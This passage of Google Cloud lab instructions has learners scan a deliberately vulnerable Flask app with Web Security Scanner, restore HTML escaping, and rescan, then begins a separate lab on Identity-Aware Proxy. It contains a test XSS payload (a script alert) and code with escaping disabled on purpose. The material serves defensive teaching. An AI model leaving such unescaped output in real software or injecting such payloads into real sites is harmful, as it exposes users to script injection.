7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  http://&lt;EXTERNAL_IP&gt;:8080</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If present, delete </span><strong><span>Starting URL 2</span></strong><span>.</span></p></li><li><p><span>Take a minute to review the remaining fields on the </span><strong><span>Create a new scan</span></strong><span> screen:</span></p></li></ol><ul><li><p><strong><span>Authentication:</span></strong><span> a property that can be used to provide application credentials to allow the scanner to authenticate to an app while scanning.</span></p></li><li><p><strong><span>Schedule:</span></strong><span> a property that can be used to schedule scans to run automatically.</span></p></li><li><p><strong><span>Export to Security Command Center:</span></strong><span> a property that allows you to automatically export scan configurations and scan results to Cloud Security Command Center after scans are finished.</span></p></li></ul><ol start='' ><li><p><span>Verify the </span><strong><span>Authentication</span></strong><span> is still set to </span><strong><span>None</span></strong><span> and that </span><strong><span>Schedule</span></strong><span> is set to </span><strong><span>Never</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Show More</span></strong><span> to investigate the remaining settings.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span> to create the scan.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This creates the scan, but do not run it yet. It must currently be run manually since you did not create a schedule yet.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run</span></strong><span> to start the scan</span></p></li></ol><p><strong><span>Note:</span></strong><span> Given the number of possible tests, this can take a little over </span><strong><span>10 minutes</span></strong><span> to scan.</span></p><ol start='' ><li><p><span>Return to your SSH session in your separate browser window.</span></p></li></ol><p><span>If the session timed out, run the following command to restart your application:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>In your SSH Window, you should start to see logs generated similar to the example below—this is Web Security Scanner testing all possible URLs for potential vulnerabilities.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.29.3.21 - - [23/Mar/2023 23:30:41] "GET /output HTTP/1.1" 200 -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:06] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:07] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "GET /output HTTP/1.1" 200 -</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>You may see log statements with the following HTTP status codes:</span></p><ul><li><p><strong><span>200:</span></strong><span> A successful request, where the HTTP server answered with an OK response.</span></p></li><li><p><strong><span>302:</span></strong><span> Indicates a resource is temporarily located elsewhere according to the Location header.</span></p></li><li><p><strong><span>404:</span></strong><span> indicates that one or more resources were not found.</span></p></li></ul><p><span>Check out the </span><a href='https://cloud.google.com/storage/docs/json_api/v1/status-codes#standardcodes'><span>HTTP Status and Error Codes</span></a><span> documentation for more information.</span></p><p><span>While the scan is running, feel free to explore the </span><strong><span>Results</span></strong><span>, </span><strong><span>URLs Crawled</span></strong><span>, and </span><strong><span>Details</span></strong><span> tabs. You can also check out this </span><a href='https://www.youtube.com/watch?v=1BengAd2_cI'><span>getting started video</span></a><span>, or this </span><a href='https://www.youtube.com/watch?v=ai5Hr5zkn50'><span>vulnerability scanning video</span></a><span> to learn more about Web Security Scanner.</span></p><ol start='' ><li><p><span>When the scan is done running, the </span><strong><span>Results</span></strong><span> tab should indicate the cross-site vulnerabilities.</span></p></li></ol><p><img src="images\zNjWH7Ajz8Vkduyrzuzfqd2sWL7fMuUdx%2BKGyE9zHNg%3D" referrerpolicy="no-referrer" alt="Web Security Scanner results with vulnerabilities"></p><p><span>The Web Security Scanner was able to scan all starting URLs and detect the XSS vulnerabilities in Cymbal Bank&#39;s application. The ability to automate the detection of these critical vulnerabilities is a major benefit for security-minded organizations like Cymbal Bank.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Run a Web Security Scanner scan and detect application vulnerabilities</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-5-correct-the-vulnerability-and-scan-again'><span>Task 5. Correct the vulnerability and scan again</span></h3><p><span>Now that you have demonstrated Web Security Scanner can detect a XSS vulnerability, you remediate the vulnerability and run the application scan again.</span></p><ol start='' ><li><p><span>Return to your SSH window that&#39;s connected to your VM instance.</span></p></li><li><p><span>Stop the running application by pressing </span><strong><span>CTRL + C</span></strong><span>.</span></p></li><li><p><span>Edit the </span><strong><span>app.py</span></strong><span> file using the nano editor by running the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Locate the two lines that set the output string:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#  output_string = "".join([html_escape_table.get(c, c) for c in input_string])</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  output_string = input_string</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Remove the </span><code>#</code><span> symbol from the first line and add it to the beginning of the next line (</span><em><span>ensure that you indent your code properly!</span></em><span>)</span></p></li></ol><p><span>Your final lines must resemble the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@app.route('/output')</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">def output():</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  output_string = "".join([html_escape_table.get(c, c) for c in input_string])</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  # output_string = input_string</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  return flask.render_template("output.html", output=output_string)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> </span><code>html_escape_table</code><span> is a dictionary that contains one-to-one pairings of special HTML characters like &quot;&lt;&quot; to their text representation. You use this table to escape special HTML characters so your form ingests and interprets submissions as raw text only. You can refer to this </span><a href='https://www.lambdatest.com/free-online-tools/html-escape#:~:text=What is HTML Escape%3F,HTML entities to plain text'><span>What is HTML Escape?</span></a><span> documentation for more information.</span></p><ol start='' ><li><p><span>Now type </span><strong><span>CTRL+X</span></strong><span>, </span><strong><span>Y</span></strong><span>, and </span><strong><span>Enter</span></strong><span> to save your changes.</span></p></li><li><p><span>Re-run the application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Return to the Google Cloud console browser tab (you should still have the Web Security Scanner page open):</span></p></li><li><p><span>Click </span><strong><span>Run</span></strong><span> at the top of the page.</span></p></li></ol><p><span>In your SSH Window, you should start to see logs where Web Security Scanner tests application URLs for potential vulnerabilities.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.29.3.21 - - [23/Mar/2023 23:30:41] "GET /output HTTP/1.1" 200 -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:06] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:07] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "GET /output HTTP/1.1" 200 -</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><ol start='' ><li><p><span>While you are waiting for the results of the scan, login to the URL </span><code>http://&lt;EXTERNAL_IP&gt;:8080</code><span> using your browser in a separate tab.</span></p><p><span>The web form displays once again.</span></p></li><li><p><span>In the web form, enter the same string that you entered in before:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;script&gt;alert('This is an XSS Injection')&lt;/script&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now click the </span><strong><span>POST</span></strong><span> button.</span></p></li><li><p><span>Verify that this time you receive the following string in the browser:</span></p></li></ol><p><img src="images\UuSnBBO%2BKVOGv47KPpzEBSOoa%2F%2FghXxJ8znqMt9TzL0%3D" referrerpolicy="no-referrer" alt="Input displayed as text string"></p><p><strong><span>Note:</span></strong><span> Although this technique works in this simple scenario, for proper protection of your web application you need to use more advanced techniques and frameworks which are out of scope of this lab.</span></p><p>&nbsp;</p><p><span>Explore the links below for more resources:</span></p><ul><li><p><a href='https://angular.io/guide/security'><span>Angular Security</span></a></p></li><li><p><a href='https://xss-game.appspot.com/'><span>Google XSS Game</span></a></p></li><li><p><a href='https://owasp.org/www-project-juice-shop/'><span>OWASP Juice Shop</span></a></p></li></ul><ol start='' ><li><p><span>Return to the Google Cloud console, where you left off on the Web Security Scanner page.</span></p></li><li><p><span>Click </span><strong><span>Run</span></strong><span> at the top of the page to re-scan your application.</span></p></li><li><p><span>Soon after, you should notice that the results yield no more XSS vulnerabilities.</span></p></li></ol><p><img src="images\nfsc%2B30HZrnOWepWCagx3F5tZlFOWKm03XuwQDa2kzQ%3D" referrerpolicy="no-referrer" alt="Web Security Scanner output with no vulnerabilities"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Correct vulnerabilities and rescan your application using Web Security Scanner</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='congratulations-15'><span>Congratulations!</span></h3><p><span>You have successfully demonstrated to the Cymbal Bank CTO how to identify and remediate XSS vulnerabilities with Google Cloud&#39;s powerful Web Security Scanner solution.</span></p><p>&nbsp;</p><h2 id='lab---securing-compute-engine-applications-with-beyondcorp-enterprise'><span>LAB - Securing Compute Engine Applications with BeyondCorp Enterprise</span></h2><p>&nbsp;</p><h2 id='overview-18'><span>Overview</span></h2><p><span>In this lab, you secure Compute Engine workloads using </span><a href='https://cloud.google.com/iap'><span>BeyondCorp Enterprise’s Identity-Aware Proxy (IAP)</span></a><span> to restrict traffic based on identity.</span></p><p><span>IAP is a feature of </span><a href='https://cloud.google.com/beyondcorp-enterprise'><span>BeyondCorp Enterprise</span></a><span>, Google Cloud&#39;s zero-trust solution that enables an organization&#39;s workforce to access web applications securely from anywhere, without the need for VPN and without fear of malware, phishing, and data loss.</span></p><p><span>This lab provisions a web-based integrated development environment (IDE) that you will restrict access to by enabling zero-trust configuration.</span></p><h2 id='objectives-15'><span>Objectives</span></h2><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Configure OAuth Consent.</span></p></li><li><p><span>Set up OAuth access credentials.</span></p></li><li><p><span>Set up IAP access for the deployed application.</span></p></li><li><p><span>Use IAP to restrict access to the application.</span></p></li></ul><h2 id='setup-and-requirements-15'><span>Setup and requirements</span></h2><h4 id='before-you-click-the-start-lab-button-6'><span>Before you click the Start Lab button</span></h4><p><strong><span>Note: Read these instructions.</span></strong></p><p>&nbsp;</p><p><span>Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.</span></p><h4 id='what-you-need-5'><span>What you need</span></h4><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li><li><p><span>Time to complete the lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab.</span></p><p><strong><span>Note:</span></strong><span> If you are using a Pixelbook, open an Incognito window to run this lab.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-console-4'><span>How to start your lab and sign in to the Console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.</span></p><p><img src="https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D" referrerpolicy="no-referrer" alt="Credentials panel"></p></li><li><p><span>Copy the username, and then click </span><strong><span>Open Google Console</span></strong><span>. The lab spins up resources, and then opens another tab that shows the </span><strong><span>Choose an account</span></strong><span> page.</span></p><p><strong><span>Note:</span></strong><span> Open the tabs in separate windows, side-by-side.</span></p></li><li><p><span>On the Choose an account page, click </span><strong><span>Use Another Account</span></strong><span>. The Sign in page opens.</span></p><p><img src="https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D" referrerpolicy="no-referrer" alt="Choose an account dialog box with Use Another Account option highlighted "></p></li><li><p><span>Paste the username that you copied from the Connection Details panel. Then copy and paste the password.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).</span></p><ol start='' ><li><p><span>Click through the subsequent pages:</span></p></li></ol><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul><p><span>After a few moments, the Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> You can view the menu with a list of Google Cloud Products and Services by clicking the </span><strong><span>Navigation menu</span></strong><span> at the top-left. </span><img src="https://cdn.qwiklabs.com/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D" referrerpolicy="no-referrer" alt="Cloud Console Menu"></p><h3 id='activate-google-cloud-shell-8'><span>Activate Google Cloud Shell</span></h3><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences 